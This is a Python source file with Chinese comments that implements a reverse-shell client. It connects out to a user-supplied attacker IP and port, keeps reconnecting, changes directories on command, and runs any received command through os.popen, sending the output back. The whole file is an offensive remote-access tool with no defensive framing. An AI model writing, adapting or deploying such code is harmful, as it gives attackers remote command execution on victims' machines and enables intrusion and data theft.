import socket
import os
import threading
import time

server_host = "Your IP"
server_port = "Your Port"
current_dir = os.getcwd()

def receive_commands(server_socket):
    global current_dir
    while True:
        try:
            command = server_socket.recv(4096).decode('utf-8')
            if not command:
                break
            
            # 处理pwd命令（服务器初始获取当前目录）
            if command.strip().lower() == 'pwd':
                server_socket.send(current_dir.encode('utf-8'))
                continue
            
            # 处理cd命令
            if command.lower().startswith('cd '):
                try:
                    if '/d' in command.lower():
                        new_dir = command[command.lower().index('/d')+3:].strip()
                    else:
                        new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    output = f"目录已更改为: {current_dir}"
                except Exception as e:
                    output = f"更改目录失败: {str(e)}"
                server_socket.send(output.encode('utf-8'))
                continue
            
            # 执行其他命令
            output = os.popen(command).read()
            server_socket.send(output.encode('utf-8'))
            
        except Exception as e:
            print(f"与服务器通信时出错: {e}")
            break

def connect_to_server():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((server_host, server_port))
            print(f"[*] 已连接到服务器 {server_host}:{server_port}")
            
            receive_thread = threading.Thread(
                target=receive_commands,
                args=(client,)
            )
            receive_thread.daemon = True
            receive_thread.start()
            receive_thread.join()
            
        except Exception as e:
            print(f"连接服务器失败: {e}\n正在尝试重新连接服务器...\n")
            time.sleep(0.5)
            
        finally:
            try:
                client.close()
            except:
                pass
            print("[*] 与服务器的连接已关闭")

if __name__ == "__main__":
    connect_to_server()